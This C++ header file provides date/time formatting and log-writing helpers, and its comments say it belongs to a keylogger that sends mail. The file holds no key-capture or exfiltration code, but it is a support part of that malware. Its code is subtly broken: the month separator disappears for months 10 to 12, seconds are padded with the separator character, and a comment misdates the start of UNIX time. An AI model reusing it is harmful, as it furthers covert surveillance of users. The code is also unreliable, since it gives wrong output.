#ifndef HELPER_H
#define HELPER_H

#include <ctime> //for mail sending triggers to activate and etc
#include <string>
#include <sstream> //to convert various types into strings
#include <fstream>

namespace Helper
{
    template <class T> //These type of functions will accept anything

    //Use this function to convert pretty much anything to a string
    std::string ToString(const T &);

    struct DateTime
    {
        DateTime()
        {
            time_t ms;
            time(&ms); //takes system time and places it into a variable called ms

            struct tm *info = localtime(&ms); //tm is also a type from ctime library

            D = info->tm_mday;
            m = info->tm_mon + 1;
            y = 1900 + info->tm_year;//1900 is the reference year, UNIX time began in the 90's
            M = info->tm_min;
            H = info->tm_hour;
            S = info->tm_sec;
        } //Gets the local time of the machine that's the program is running on
        DateTime (int D, int m, int y, int H, int M, int S) : D(D), m(m), y(y), H(H), M(M), S(S) {}
        DateTime(int D,int m, int y) :  D(D), m(m), y(y), H(0), M(0), S(0) {}

        //This is used to get the current dateTime
        DateTime Now() const
        {
            return DateTime();
        }

        int D, m, y, H, M, S;

        std::string GetDateString() const
        {
            return std::string( D < 10 ? "0" : "") + ToString(D) +
                   std::string( m < 10 ? ".0" : "") + ToString(m) + "." + ToString(y);
            //if D is less than 10 then give us 0 or otherwise give us  the empty string
            //concatenate that with ToString(D) and the other statements
        }

        std::string GetTimeString(const std::string &sep = ":") const
        {
            return std::string( H < 10 ? "0" : "") + ToString(H) + sep +
                   std::string( M < 10 ? "0" : "") + ToString(M) + sep +
                   std::string(S < 10 ? sep : "") + ToString(S);

        }
        std::string GetDateTimeString( const std::string &sep = ":") const
        {
            return GetDateString() + " " + GetTimeString(sep);
        }
    };

    template <class T>

    std::string ToString(const T &e)
    {
        std::ostringstream s;
        s << e;
        return s.str();
    }

    //This function is used to debugging and will record logs
    //With this we can see how the keylogger behaves

    void WriteAppLog( const std::string &s)
    {
        std::ofstream file("Applog.txt", std::ios::app); //app stands for append
        file << " " << Helper::DateTime().GetDateTimeString() << " " <<
        "\n" << s << std::endl << "\n";
        file.close();
    }

}


#endif // HELPER_H
